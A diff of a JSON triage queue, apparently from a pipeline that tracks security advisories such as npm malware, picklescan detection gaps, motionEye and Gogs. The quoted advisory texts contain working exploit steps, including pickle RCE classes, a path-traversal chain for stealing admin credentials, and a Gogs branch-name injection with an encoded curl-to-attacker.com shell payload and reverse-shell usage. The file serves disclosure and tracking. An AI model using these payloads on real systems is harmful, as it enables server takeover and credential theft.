       "canonicalSubjectId": "GHSA-J29F-62X7-HJ66",
@@ -1100,6 +1154,59 @@
         "active exploitation or malware signal",
         "advisory database signal",
         "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-1917e9d086d5d0c2",
+      "canonicalSubjectId": "GHSA-RR7C-77W4-J8C8",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malware in @kl-dolphin/swim",
+      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "github-advisory"
+      ],
+      "sourceRefs": [
+        "https://github.com/advisories/GHSA-rr7c-77w4-j8c8"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-rr7c-77w4-j8c8"
+      ],
+      "firstSeenAt": "2026-06-24T18:16:25.000Z",
+      "lastMaterialActivityAt": "2026-06-24T18:16:25.000Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p1",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T18:16:25.000Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 59,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal"
       ],
       "queueAction": "candidate_review",
       "draftingAllowed": false,
@@ -2327,11 +2434,14 @@
       "rankReasons": [
         "current lead",
         "active exploitation or malware signal",
-        "advisory database signal"
+        "advisory database signal",
+        "carried forward pending review"
       ],
       "queueAction": "candidate_review",
       "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check.",
+      "staleCarryForward": true,
+      "carriedForwardAt": "2026-06-24T18:18:09.525Z"
     },
     {
       "candidateId": "SC-CAND-91ac5d812d88eef9",
@@ -2457,19 +2567,16 @@
       "title": "Picklescan has a missing detection when calling built-in python idlelib.calltip.Calltip",
       "summary": "### Summary Using idlelib.calltip.Calltip.fetch_tip, which is a built-in python library function to execute remote pickle file. ### Details The attack payload executes in the following steps: First, the attacker craft the payload by calling to idlelib.calltip.Calltip.fetch_tip function in reduce method Then when the victim after checking whether the pickle file is safe by using Picklescan library and this library doesn't dectect any dangerous functions, decide to pickle.load() this malicious pickle file, thus lead to remote code execution. ### PoC ``` class EvilCalltipFetchTip: def __reduce__(self): from idlelib.calltip import Calltip # fetch_tip(expression) -> get_entity(expression) -> eval(expression) return Calltip().fetch_tip, (\"__import__('os').system('whoami')\",) ``` ### Impact Who is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models. What is the impact? Attackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded. Supply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects. ### Corresponding https://github.com/FredericDT https://github.com/Qhaoduoyu",
       "sources": [
-        "github-advisory",
-        "osv"
+        "github-advisory"
       ],
       "sourceRefs": [
-        "https://osv.dev/vulnerability/GHSA-8r4j-24qv-fmq9",
         "https://github.com/advisories/GHSA-8r4j-24qv-fmq9"
       ],
       "mergedLeadRefs": [
-        "github-advisory:GHSA-8r4j-24qv-fmq9",
-        "osv:GHSA-8r4j-24qv-fmq9"
+        "github-advisory:GHSA-8r4j-24qv-fmq9"
       ],
       "firstSeenAt": "2025-08-26T18:38:43.000Z",
-      "lastMaterialActivityAt": "2026-06-24T13:15:09.047Z",
+      "lastMaterialActivityAt": "2026-06-24T13:02:03.000Z",
       "activityBasis": [
         "advisory_updated"
       ],
@@ -2512,19 +2619,16 @@
       "title": "Picklescan has a missing detection when calling built-in python idlelib.debugobj.ObjectTreeItem",
       "summary": "### Summary Using idlelib.debugobj.ObjectTreeItem.SetText, which is a built-in python library function to execute remote pickle file. ### Details The attack payload executes in the following steps: First, the attacker craft the payload by calling to idlelib.debugobj.ObjectTreeItem.SetText function in reduce method Then when the victim after checking whether the pickle file is safe by using Picklescan library and this library doesn't dectect any dangerous functions, decide to pickle.load() this malicious pickle file, thus lead to remote code execution. ### PoC ``` class EvilDebugobjSetText: def __reduce__(self): from idlelib.debugobj import ObjectTreeItem # ObjectTreeItem(..., setfunction=print).SetText(cmd) return ObjectTreeItem(\"label\", None, print).SetText, (\"__import__('os').system('whoami')\",) ``` ### Impact Who is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models. What is the impact? Attackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded. Supply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects. ### Corresponding https://github.com/FredericDT https://github.com/Qhaoduoyu",
       "sources": [
-        "github-advisory",
-        "osv"
+        "github-advisory"
       ],
       "sourceRefs": [
-        "https://osv.dev/vulnerability/GHSA-3vg9-h568-4w9m",
         "https://github.com/advisories/GHSA-3vg9-h568-4w9m"
       ],
       "mergedLeadRefs": [
-        "github-advisory:GHSA-3vg9-h568-4w9m",
-        "osv:GHSA-3vg9-h568-4w9m"
+        "github-advisory:GHSA-3vg9-h568-4w9m"
       ],
       "firstSeenAt": "2025-08-26T18:36:42.000Z",
-      "lastMaterialActivityAt": "2026-06-24T13:15:09.043Z",
+      "lastMaterialActivityAt": "2026-06-24T13:01:46.000Z",
       "activityBasis": [
         "advisory_updated"
       ],
@@ -2629,110 +2733,6 @@
       ],
       "firstSeenAt": "2026-06-19T14:46:33.000Z",
       "lastMaterialActivityAt": "2026-06-23T19:20:32.000Z",
-      "activityBasis": [
-        "advisory_updated"
-      ],
-      "entityMatch": "new",
-      "matchedEntityHints": {
-        "actors": [],
-        "campaigns": [],
-        "packages": [],
-        "malwareFamilies": []
-      },
-      "classification": {
-        "leadClass": "current",
-        "leadClassReason": "material activity within 180 days",
-        "workIntent": "create_article",
-        "routingPriority": "p2",
-        "effectiveActiveStatus": "none",
-        "activeStatus": "none",
-        "activeStatusExpiresAt": null,
-        "needsReverify": false,
-        "kevStatusDerived": null,
-        "kevStatusIsAuthoredTruth": false,
-        "manualOverrideValid": false,
-        "manualOverrideErrors": []
-      },
-      "rank": 46,
-      "rankReasons": [
-        "current lead",
-        "advisory database signal",
-        "supply-chain term match"
-      ],
-      "queueAction": "candidate_review",
-      "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
-    },
-    {
-      "candidateId": "SC-CAND-a4f9bcba9bd114e6",
-      "canonicalSubjectId": "GHSA-PHV5-334H-MXCW",
-      "subjectType": "incident",
-      "proposedArchetype": "incident",
-      "title": "motionEye Partial Authentication Bypass: Unauthenticated Admin Credential Theft via Path Traversal",
-      "summary": "# Partial Authentication Bypass: Unauthenticated Admin Credential Theft via Path Traversal ### Summary Myself and others have reported several RCE vulnerabilities to this project. However, due to the nature of the app, these are largely not of all that much value, as there is built-in functionality to run commands upon certain actions — i.e. RCE is by design. With that in mind, I endeavored to find some sort of auth bypass, and was slightly successful. When the admin password is set but the normal (surveillance) user password is left empty (the default), an unauthenticated attacker can exploit a path traversal vulnerability to read the motionEye configuration file from disk. This file contains the admin password as a SHA-1 hash, and that hash is accepted directly as a signing key for admin API requests — no cracking required. The result is full admin access from zero credentials. This is a realistic scenario: many installations set an admin password to protect the settings UI but leave the normal user password empty so household members can view camera feeds without logging in. ### Details The vulnerability chains two independent issues: **1. Unauthenticated normal-user access when `@normal_password` is empty** In `motioneye/handlers/base.py`, lines 149-151: ```python # no authentication required for normal user if not username and not normal_password: return 'normal' ``` When `@normal_password` is empty (the default — see `config.py` line 2251: `data.setdefault('@normal_password', '')`), any request without a `_username` parameter is silently granted `normal` user access. This is by design for convenience, but it means all normal-level endpoints are fully unauthenticated. **2. Path traversal in `MoviePlaybackHandler` (and related handlers)** The movie playback handler at `motioneye/handlers/movie_playback.py` serves recorded video files. It accepts a filename in the URL path: ``` GET /movie/<camera_id>/playback/<filename> ``` The filename is passed to `mediafiles.get_media_path()` (`mediafiles.py` lines 497-500): ```python def get_media_path(camera_config, path, media_type): target_dir = camera_config.get('target_dir') full_path = os.path.join(target_dir, path) return full_path ``` When `path` is an absolute path (e.g. `/etc/motioneye/motion.conf`), Python's `os.path.join()` discards `target_dir` entirely and returns the absolute path as-is. This would normally be caught by Tornado's `StaticFileHandler` path validation, but `MoviePlaybackHandler` explicitly overrides both safety checks (`movie_playback.py` lines 111-115): ```python def get_absolute_path(self, root, path): return path def validate_absolute_path(self, root, absolute_path): return absolute_path ``` This allows reading any file on the filesystem that the motionEye process can access. The same path traversal exists in the movie download, picture download, and picture preview handlers: - `GET /movie/<camera_id>/download/<filename>` - `GET /picture/<camera_id>/download/<filename>` - `GET /picture/<camera_id>/preview/<filename>` **3. Admin hash stored in a readable config file and accepted directly as a signing key** motionEye stores the admin password as `SHA1(plaintext)` in its main configuration file (`motion.conf`), written as a comment line: ``` # @admin_password 7b7d55439abccf4ae83047c1af2707e6eb6664db ``` The authentication code in `base.py` (lines 137-147) accepts signatures computed with **either** the raw stored hash or `SHA1(stored_hash)` as the signing key: ```python if username == admin_username and ( signature == utils.compute_signature( self.request.method, self.request.uri, self.request.body, admin_password ) or signature == utils.compute_signature( self.request.method, self.request.uri, self.request.body, admin_hash ) ): return 'admin' ``` Here `admin_password` is the raw value from the config file (the SHA-1 hash), and `admin_hash` is `SHA1(admin_password)` — a hash of the hash. Since the stored value is already a SHA-1 hash, and it is accepted directly as a valid signing key, there is no need to crack it. The attacker can use the stolen hash immediately. Furthermore, the client-side JavaScript (`static/js/main.js` line 3631) computes `sha1(plaintext_password)` and stores it in the `meye_password_hash` cookie as the signing key. This is the same value as `@admin_password` in the config file. ### PoC **Step 1** — Read the config file (unauthenticated, requires empty normal password): ``` GET /movie/1/playback//etc/motioneye/motion.conf HTTP/1.1 Host: target:8765 ``` Response contains: ``` # @admin_username admin # @admin_password 7b7d55439abccf4ae83047c1af2707e6eb6664db ``` **Step 2** — Use the hash to become admin. In the browser console: ```javascript document.cookie = \"meye_username=admin; path=/\"; document.cookie = \"meye_password_hash=7b7d55439abccf4ae83047c1af2707e6eb6664db; path=/\"; location.reload(); ``` The page reloads with full admin access. All subsequent requests are signed with the stolen hash. **Step 3 (optional)** — Achieve RCE via the admin config API. The admin can set `command_notifications_exec` or `command_storage_exec` to arbitrary shell commands, which are written into motion event hooks and executed by the motion daemon: ``` POST /config/1/set HTTP/1.1 Content-Type: application/json {\"command_notifications_enabled\": true, \"command_notifications_exec\": \"touch /tmp/pwned\", ...} ``` ### Impact - **Privilege escalation from zero credentials to full admin** on any installation where the admin password is set but the normal user password is left empty (the default configuration). - **Arbitrary file read** of any file readable by the motionEye process (typically running as `motion` user, or `root` on motionEyeOS). This includes `/etc/passwd`, `/etc/shadow` (if permissions allow), SSH keys, and application secrets. - **Full remote code execution** — once admin access is obtained, the attacker can inject arbitrary shell commands via motion event hooks (`command_notifications_exec`, `command_storage_exec`, or `web_hook_storage_url`). Commands execute as the motion daemon user. - **Realistic attack surface** — this is a common configuration for home surveillance setups where the admin password protects settings but camera feeds are left open for household members. Public instances are discoverable via Shodan (`http.favicon.hash:1898775751`). ### Suggested Fix 1. The path traversal should be fixed by validating that the resolved path stays within the camera's `target_dir`. Do not override `get_absolute_path` and `validate_absolute_path` to bypass Tornado's built-in protections. At minimum, reject absolute paths in the filename parameter. 2. Consider warning users in the UI when the normal user password is empty, as this makes all normal-level endpoints (including the vulnerable file handlers) fully unauthenticated. 3. The admin password hash should not be stored in a file that is served by the same file handlers used for media content. Alternatively, the `@` metadata lines should be moved to a separate configuration file that is not within any camera's media path.",
-      "sources": [
-        "github-advisory"
-      ],
-      "sourceRefs": [
-        "https://github.com/advisories/GHSA-phv5-334h-mxcw"
-      ],
-      "mergedLeadRefs": [
-        "github-advisory:GHSA-phv5-334h-mxcw"
-      ],
-      "firstSeenAt": "2026-06-23T19:09:29.000Z",
-      "lastMaterialActivityAt": "2026-06-23T19:09:29.000Z",
-      "activityBasis": [
-        "advisory_updated"
-      ],
-      "entityMatch": "new",
-      "matchedEntityHints": {
-        "actors": [],
-        "campaigns": [],
-        "packages": [],
-        "malwareFamilies": []
-      },
-      "classification": {
-        "leadClass": "current",
-        "leadClassReason": "material activity within 180 days",
-        "workIntent": "create_article",
-        "routingPriority": "p2",
-        "effectiveActiveStatus": "none",
-        "activeStatus": "none",
-        "activeStatusExpiresAt": null,
-        "needsReverify": false,
-        "kevStatusDerived": null,
-        "kevStatusIsAuthoredTruth": false,
-        "manualOverrideValid": false,
-        "manualOverrideErrors": []
-      },
-      "rank": 46,
-      "rankReasons": [
-        "current lead",
-        "advisory database signal",
-        "supply-chain term match"
-      ],
-      "queueAction": "candidate_review",
-      "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
-    },
-    {
-      "candidateId": "SC-CAND-639b2329b64f5987",
-      "canonicalSubjectId": "CVE-2024-39930",
-      "subjectType": "cve",
-      "proposedArchetype": "incident",
-      "title": "Gogs vulnerable to RCE via git rebase --exec argument injection in pull request merge",
-      "summary": "# Gogs: RCE via `git rebase --exec` Argument Injection in PR Merge ## Summary Gogs allows authenticated users to achieve Remote Code Execution (RCE) on the server by creating a pull request with a specially crafted branch name that injects the `--exec` flag into the `git rebase` command during the \"Rebase before merging\" merge operation. ## Severity **Critical** - CVSS 3.1 Base Score: 9.9 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H) ## Affected Versions - **Gogs 0.14.2** (latest supported release) - Gogs 0.15.0+dev (commit `b53d3162`, main branch as of 2026-03-16) - All prior versions that support the \"Rebase before merging\" merge style ## Impact This is a **privilege escalation from authenticated user to server-level code execution**. The attacker uses their own repository as the delivery mechanism - the target is not the repository but the Gogs server itself. On any multi-tenant Gogs instance (company, university, open source hosting), this gives one authenticated user full control of the underlying server: - **Server compromise**: Arbitrary command execution as the Gogs process user - **Cross-tenant data breach**: Read ALL repositories on the instance, including other users' private repos - **Credential theft**: Access the database containing password hashes, API tokens, SSH keys, and 2FA secrets for every user - **Lateral movement**: Pivot to other systems accessible from the server's network - **Supply chain attacks**: Silently modify any hosted repository's code. The Gogs process user (typically `git`) has direct filesystem-level read/write access to every repository on the instance under a single `REPOSITORY_ROOT` directory (default: `~/gogs-repositories`). There is no OS-level isolation between repositories; all access control is application-layer only. The vulnerability affects all supported platforms (Linux, macOS, Windows) and installation methods (pre-built binary, Docker, source). On Docker installations, the Gogs process runs as the `git` user (UID 1000 by default). The severity is heightened because: - **Open registration by default**: Gogs ships with `DISABLE_REGISTRATION = false`, meaning anyone can create an account on a default-configured instance - effectively making this exploitable by an unauthenticated attacker. - **No admin required**: Any user who creates a repository is automatically its admin. Enabling rebase is a single toggle in Settings > Advanced - no site-admin intervention, no special permissions, and no interaction with other users required. The attacker creates a repo, enables rebase, and exploits, all within their own account. (Note: `PullsAllowRebase` defaults to `false`, but this is irrelevant since any repo creator can enable it themselves.) - The attacker operates entirely within their own repo - no interaction with or access to other users' repos is needed to trigger the exploit - The exploit is fully automatable (see PoC) - The exploit leaves minimal traces (a 500 error in server logs, easily missed) ## Prerequisites The attacker needs **one** of the following: - **Repo admin/owner** on any repository (can enable rebase + create PR + merge) - **any user who creates a repo has this by default** - **Write access** to a repository where \"Rebase before merging\" is already enabled by the owner (can create malicious branch + PR + merge) Note: \"Rebase before merging\" is NOT enabled by default (`PullsAllowRebase` defaults to `false` in `internal/database/repo.go:215`). However: - Any user who creates their own repository is admin of that repo and can enable rebase via Settings > Advanced - The repo settings endpoint (`/settings`, action=`advanced`) requires `reqRepoAdmin` middleware (`internal/cmd/web.go:472`) - collaborators with only write access cannot enable it, but repo owners/admins can - Many organizations enable rebase merge as a standard practice ## Root Cause Analysis In `internal/database/pull.go`, the [`Merge()` function](https://github.com/gogs/gogs/blob/v0.14.2/internal/database/pull.go#L282) passes the PR's base branch name to `git rebase` as a positional argument without a `--` separator: ```go if _, stderr, err = process.ExecDir(-1, tmpBasePath, fmt.Sprintf(\"PullRequest.Merge (git rebase): %s\", tmpBasePath), \"git\", \"rebase\", \"--quiet\", pr.BaseBranch, remoteHeadBranch); err != nil { ``` The `pr.BaseBranch` value originates from the [URL parameter](https://github.com/gogs/gogs/blob/v0.14.2/internal/route/repo/pull.go#L447) in `internal/route/repo/pull.go`: ```go baseRef := infos[0] // from strings.Split(c.Params(\"*\"), \"...\") ``` Both `baseRef` and `headRef` are validated via [`RevParse`](https://github.com/gogs/gogs/blob/v0.14.2/internal/route/repo/pull.go#L482) (defined in the external [`git-module`](https://github.com/gogs/git-module) library), but this only calls `git rev-parse --verify <ref>` - it checks that the ref resolves to a valid git object, not that it is safe against argument injection. Since the attacker pushes the malicious branch name to the repository, `RevParse` succeeds because the ref genuinely exists. The value is stored in the database and later passed as-is to the `git rebase` command without a `--` separator. ## Exploitation Git branch names can legally contain characters `$`, `{`, `}`, `=`, `-`. The attacker creates a branch named: ```bash --exec=touch${IFS}/tmp/rce_proof ``` When used as `pr.BaseBranch` in the rebase command: ```bash git rebase --quiet '--exec=touch${IFS}/tmp/rce_proof' 'head_repo/feature' ``` 1. Git's argument parser treats `--exec=touch${IFS}/tmp/rce_proof` as the `--exec` flag 2. The `--exec` flag specifies a command to run via `sh -c` after each replayed commit 3. `${IFS}` expands to a space in the shell, bypassing git's prohibition on spaces in branch names 4. The command `touch /tmp/rce_proof` executes as the Gogs server process user For commands containing characters forbidden in git refs (`:`, `~`, `^`, `?`, `*`, `[`, `\\`, `//`), such as URLs, the attacker base64-encodes the payload: ```bash --exec=echo${IFS}<base64>|base64${IFS}-d|sh ``` For example, `curl https://attacker.com/shell.sh|sh` becomes: ```bash --exec=echo${IFS}Y3VybCBodHRwczovL2F0dGFja2VyLmNvbS9zaGVsbC5zaHxzaA==|base64${IFS}-d|sh ``` This was validated end-to-end: a `wget` command with a URL executed inside the Docker container and wrote the fetched HTML to disk. ### Full Execution Flow in `Merge()` The `MergeStyleRebase` code path in `Merge()` executes these git commands sequentially: | Step | Command | Result with malicious branch | | ---------------------------------------------------------------------------------- | --------------------------------------------------------- | ---------------------------------------------------------------------------- | | [1](https://github.com/gogs/gogs/blob/v0.14.2/internal/database/pull.go#L233) | `git clone -b '<malicious>' <repo> <tmp>` | **Succeeds** - `-b` consumes `--exec=...` as the branch value | | [2](https://github.com/gogs/gogs/blob/v0.14.2/internal/database/pull.go#L238-L248) | `git remote add head_repo <repo>` + `git fetch head_repo` | Succeeds normally | | [3](https://github.com/gogs/gogs/blob/v0.14.2/internal/database/pull.go#L282) | `git rebase --quiet '<malicious>' 'head_repo/feature'` | **RCE fires here** - `--exec=<cmd>` parsed as flag, command runs via `sh -c` | | [4](https://github.com/gogs/gogs/blob/v0.14.2/internal/database/pull.go#L290) | `git checkout -b <tmpBranch>` | Succeeds (tmpBranch is a server-generated timestamp) | | [5](https://github.com/gogs/gogs/blob/v0.14.2/internal/database/pull.go#L297) | `git checkout '<malicious>'` | **Fails** - git interprets `--exec=...` as invalid option for checkout | Step 5 failure causes `Merge()` to return an error (HTTP 500), but **the RCE has already executed at Step 3**. The 500 error is logged but does not prevent exploitation. Defenders can look for this IOC in server logs: ```log [E] ...merge: git checkout '--exec=<...>': exit status 128 - error: unknown option `exec=<...>' ``` This is logged via [`c.Error(err, \"merge\")`](https://github.com/gogs/gogs/blob/v0.14.2/internal/route/repo/pull.go#L419) at ERROR level. ### Why the PR Becomes Mergeable The `testPatch()` function (called during PR creation at line 468) calls `UpdateLocalCopyBranch(pr.BaseBranch)` (`internal/database/repo.go:658`), which has two code paths: - **No local copy exists** (first call for a repo): Calls `git.Clone()` (line 664), which includes `--end-of-options` → the malicious branch name is treated as data, clone succeeds, and `testPatch` completes normally. - **Local copy already exists** (subsequent calls): Calls `gitRepo.Checkout(branch)` (line 684), which is missing `--end-of-options` → git interprets `--exec=...` as a flag → checkout fails → `testPatch` returns an error. The exploit relies on the following causal chain: 1. During PR creation (`NewPullRequest`, line 468), `testPatch()` is called. For a **fresh repository** with no local copy, the Clone path succeeds. 2. Because `testPatch` didn't set the status to `PullRequestStatusConflict`, the status remains `PullRequestStatusChecking`, and the code at line 472-473 promotes it to `PullRequestStatusMergeable`. 3. The background `TestPullRequests` goroutine (line 840) periodically re-checks PRs. When it calls `testPatch` again, the local copy now exists, so `UpdateLocalCopyBranch` takes the Checkout path → fails → returns an error. 4. This error causes `TestPullRequests` to skip adding the PR to the update list (`return nil` at line 855) or skip `checkAndUpdateStatus()` (`continue` at line 877). Because `checkAndUpdateStatus` is never called, **the PR status remains at Mergeable indefinitely**. The PoC handles this by creating a **fresh repository** (no local copy exists yet), ensuring the first `testPatch` succeeds via the Clone path. ### Proof of Concept A standalone Python exploit (`gogs-rebase-rce.py`) is attached to this advisory. It automates the full exploit chain (authentication, repo creation, rebase enablement, payload delivery, PR creation, merge trigger, and cleanup) and supports both Linux and Windows targets. Requires Python 3.8+, `requests`, and a local `git` installation. #### Usage ```bash # Reverse shell (Linux) python3 gogs-rebase-rce.py -t http://gogs:3000 -u attacker -p Password123 -l <LHOST> -x <LPORT> # Reverse shell (Windows) python3 gogs-rebase-rce.py -t http://gogs:3000 -u attacker -p Password123 -l <LHOST> -x <LPORT> --os windows # Custom command python3 gogs-rebase-rce.py -t http://gogs:3000 -u attacker -p Password123 -c 'id > /tmp/pwned' # Version fingerprint only (no exploit) python3 gogs-rebase-rce.py -t http://gogs:3000 -u attacker -p Password123 --check ``` #### Demo Run the PoC with a reverse shell payload: ```bash python3 gogs-rebase-rce.py -t http://localhost:3080 -u attacker -p Password123 -l 172.17.0.1 -x 1337 [*] Fingerprinting target... [+] Gogs 0.14.2 detected [*] Authenticating as \"attacker\" [+] Authenticated [*] Creating repository [+] Repository xxxx-yyyy created [*] Enabling rebase merge [+] Rebase merge enabled [*] Pushing branches via git [+] Branches pushed [*] Creating pull request [+] PR #1 created [*] Triggering rebase merge - RCE fires now! [+] Rebase merge triggered ``` Checking the listener: ```bash $ nc -nlvp 1337 Listening on 0.0.0.0 1337 Connection received on 172.17.0.2 43240 $ whoami git ``` ### Manual Browser Reproduction This can be reproduced entirely through the Gogs web UI: **Prerequisites**: A running Gogs instance (e.g., `http://localhost:3080`) with a registered user account. **Step 1: Create a repository and push branches** ```bash # Create repo via Gogs API curl -s -u attacker:Password123 -X POST http://localhost:3080/api/v1/user/repos \\ -H 'Content-Type: application/json' -d '{\"name\":\"demo\"}' # Set up local repo with divergent branches mkdir /tmp/demo && cd /tmp/demo && git init git config user.email \"attacker@test.com\" && git config user.name \"attacker\" echo \"# Demo\" > README.md && git add . && git commit -m \"Initial commit\" git checkout -b feature echo \"feature\" > feature.txt && git add . && git commit -m \"Add feature\" git checkout master echo \"update\" >> README.md && git add . && git commit -m \"Update master\" # Create the malicious branch (same commit as master) git update-ref 'refs/heads/--exec=touch${IFS}/tmp/BROWSER_RCE_PROOF' HEAD # Push all branches git remote add origin http://attacker:Password123@localhost:3080/attacker/demo.git git push origin master feature 'refs/heads/--exec=touch${IFS}/tmp/BROWSER_RCE_PROOF:refs/heads/--exec=touch${IFS}/tmp/BROWSER_RCE_PROOF' ``` **Step 2: Enable rebase in repo settings** 1. Navigate to `http://localhost:3080/attacker/demo/settings` 2. Click **Advanced Settings** 3. Check **Enable Pull Requests**, then check **Allow rebase** 4. Click **Save** (Or update the database directly: `UPDATE repository SET enable_pulls=1, pulls_allow_rebase=1 WHERE lower_name='demo';`) **Step 3: Create the Pull Request** Navigate to the compare URL (base = malicious branch, head = feature): ``` http://localhost:3080/attacker/demo/compare/%2D%2Dexec%3Dtouch%24%7BIFS%7D%2Ftmp%2FBROWSER_RCE_PROOF...feature ``` Enter a title (e.g., \"RCE PoC\") and click **New Pull Request**. **Step 4: Wait for testPatch (~5 seconds)** The background `TestPullRequests` goroutine must set the PR to Mergeable. Wait a few seconds, then refresh the PR page. The merge button should appear. **Step 5: Trigger the merge** 1. On the PR page (`/attacker/demo/pulls/1`), select **Rebase before merging** 2. Click **Merge Pull Request** 3. The server returns HTTP 500 (expected - `git checkout` of the malicious branch name fails after rebase) **Step 6: Verify RCE** ```bash $ ls -la /tmp/BROWSER_RCE_PROOF -rw-rw-r-- 1 cryptocat cryptocat 0 Mar 16 18:02 /tmp/BROWSER_RCE_PROOF ``` The file was created by the Gogs server process during `git rebase --exec` ## Recommended Fix ### Primary fix: Add `--` separator ```go // internal/database/pull.go line 282 \"git\", \"rebase\", \"--quiet\", \"--\", pr.BaseBranch, remoteHeadBranch ``` ### Defense-in-depth: Validate branch names Reject base branch names starting with `-` at the PR creation endpoint: ```go // internal/route/repo/pull.go, after line 447 if strings.HasPrefix(baseRef, \"-\") { c.NotFound() return nil, nil, nil, nil, \"\", \"\" } ``` ### Additional hardening Apply `--` separators to all other `process.ExecDir` calls in `Merge()` that use `pr.BaseBranch`: - Line 233: `git clone -b pr.BaseBranch` (not directly exploitable but should be hardened) - Line 297: `git checkout pr.BaseBranch` (currently fails, but should use `-- pr.BaseBranch`) - Line 315: `git push <repo> pr.BaseBranch` (should use `--` separator) ## Relationship to Prior Argument Injection Fixes This vulnerability is an **incomplete fix bypass** of the Category A argument injection invariant that Gogs has been patching across multiple advisories: | Advisory | CVE | Description | Fix Applied | | ------------------------------------------------------------------------------------------- | ----------------------------------------------------------------- | -------------------------------------------- | -------------------------------------------------------------- | | [GHSA-m27m-h5gj-wwmg](https://github.com/gogs/gogs/security/advisories/GHSA-m27m-h5gj-wwmg) | [CVE-2024-39933](https://nvd.nist.gov/vuln/detail/CVE-2024-39933) | Argument injection when tagging new releases | Added `--` separator to `git tag` | | [GHSA-9pp6-wq8c-3w2c](https://github.com/gogs/gogs/security/advisories/GHSA-9pp6-wq8c-3w2c) | [CVE-2024-39932](https://nvd.nist.gov/vuln/detail/CVE-2024-39932) | Argument injection during changes preview | Added `--end-of-options` to `git diff` | | [GHSA-v9vm-r24h-6rqm](https://github.com/gogs/gogs/security/advisories/GHSA-v9vm-r24h-6rqm) | [CVE-2026-26194](https://nvd.nist.gov/vuln/detail/CVE-2026-26194) | Release tag option injection in deletion | Migrated to safe git-module API | | [GHSA-vm62-9jw3-c8w3](https://github.com/gogs/gogs/security/advisories/GHSA-vm62-9jw3-c8w3) | [CVE-2024-39930](https://nvd.nist.gov/vuln/detail/CVE-2024-39930) | Argument injection in built-in SSH server | Added `--` separator to `git upload-pack` / `git receive-pack` | The [`git-module` library](https://github.com/gogs/git-module) (`v1.8.7`) was hardened with `--end-of-options` in `Clone()`, `Push()`, `Fetch()`, and 28 other call sites. However, the `Merge()` function in `internal/database/pull.go` **bypasses all of these protections** because it uses raw `process.ExecDir` (which wraps `exec.Command` directly) instead of the safe git-module API. The [`git rebase` call](https://github.com/gogs/gogs/blob/v0.14.2/internal/database/pull.go#L282) was never migrated. Notably, `git-module.Checkout()` is also missing `--end-of-options` — a separate gap that incidentally causes the `testPatch` race condition this exploit leverages (see \"Why the PR Becomes Mergeable\" above). ## Affected Platforms The vulnerability has been confirmed on: - **Linux**: Docker (official image) and binary installation on Ubuntu 24.04 - **Windows**: Binary installation with Git for Windows (MSYS2) On Windows, the base64 inline payload approach fails because NTFS forbids the `|` character in filenames (git stores refs as files). The exploit uses file-based payload delivery instead: the payload is committed as a script file, and the branch name becomes `--exec=sh${IFS}<filename>`. An `sh` wrapper invokes `cmd.exe //c <payload>.bat` to avoid MSYS2 shell metacharacter mangling. The attached PoC handles this automatically. ## Test Environment - **OS**: Ubuntu Linux 24.04, Windows (Git for Windows) - **Gogs version**: 0.14.2 (also confirmed on 0.15.0+dev, commit `b53d3162`) - **Go version**: go1.26.1 - **Database**: SQLite - **Deployment**: Docker (official image), binary, and built from source ## Credit Jonah Burgess (CryptoCat) - Senior Security Researcher @Rapid7",
-      "sources": [
-        "github-advisory"
-      ],
-      "sourceRefs": [
-        "https://github.com/advisories/GHSA-qf6p-p7ww-cwr9"
-      ],
-      "mergedLeadRefs": [
-        "github-advisory:GHSA-qf6p-p7ww-cwr9"
-      ],
-      "firstSeenAt": "2026-06-23T17:02:40.000Z",
-      "lastMaterialActivityAt": "2026-06-23T17:02:42.000Z",
       "activityBasis": [
         "advisory_updated"
       ],
